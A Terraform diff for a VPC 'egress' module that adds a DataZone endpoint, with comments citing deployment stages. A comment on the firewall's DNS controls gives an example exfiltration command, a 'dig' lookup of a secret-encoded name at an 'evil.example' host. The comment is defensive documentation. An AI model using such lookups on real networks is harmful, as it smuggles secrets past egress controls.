@@ -52,10 +52,11 @@ module "egress" {
   #   athena         when a job inside the VPC queries through it (an integration test's, Stage 8 3.3)
   #   monitoring     when Stage 10's verification xvi reads the workers' metrics refused
   #
-  # `datazone` stays out: `DenyDataZoneEntirely` refuses this account the service, and the endpoint
-  # Stage 18 7.1 added for its window left with it.
+  # `datazone` is here for the deployment project (Stage 19 step 4.4): the publishing task's worker
+  # and the Glue job's lineage posts call the domain from inside this VPC, and without the endpoint a
+  # post read "Network is unreachable" (Stage 18 7.1, 2026-10-19).
   core_services  = ["sts", "logs", "kms", "glue", "lakeformation"]
-  extra_services = ["sagemaker.api", "secretsmanager"]
+  extra_services = ["sagemaker.api", "secretsmanager", "datazone"]
 
   # The firewall closes the VPC resolver as an exfiltration channel (6c step 5.7), which exists
   # wherever code runs, with or without a route: `dig secret-payload.evil.example` leaves through the
